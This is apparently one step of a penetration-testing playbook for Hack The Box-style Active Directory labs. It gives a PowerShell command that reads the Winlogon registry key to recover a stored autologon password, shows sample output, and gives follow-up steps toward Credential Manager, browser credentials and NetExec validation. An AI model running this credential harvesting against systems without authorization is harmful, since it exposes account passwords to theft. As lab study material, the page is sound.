# AD - Local Credential Search

**Step 44 of 50 · AD**

*Search common Windows credential locations after the foothold has no direct group or token path.*

## Run this

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object AutoAdminLogon,DefaultUserName,DefaultDomainName,DefaultPassword
```

## Example output

```

AutoAdminLogon    DefaultUserName       DefaultDomainName  DefaultPassword
--------------    ---------------       -----------------  -----------------
1                 HTB\\svc_accountname   HTB                [redacted]
```
## What did you get?

- [ ] DefaultPassword is populated → **Validate the candidate with NetExec, then go to Step 45 · [[AD - BloodHound]]**
- [ ] Winlogon has no useful values → **Check Windows Credential Manager and browser credential locations, then go to Step 45 · [[AD - BloodHound]]**
- [ ] A candidate fails with its displayed username → **Try the shortened SAMAccountName, then return to Step 40 · [[AD - Credential Validation]]**
- [ ] No local credentials are found → **Go to Step 45 · [[AD - BloodHound]]**

## Notes

Winlogon autologon stores a password so Windows can sign in automatically. Treat the output as sensitive.

## Gotcha

> [!warning] 💡
> `DefaultUserName` may be a display name rather than the SAMAccountName. Validate it with NetExec instead of assuming it is the exact login name.
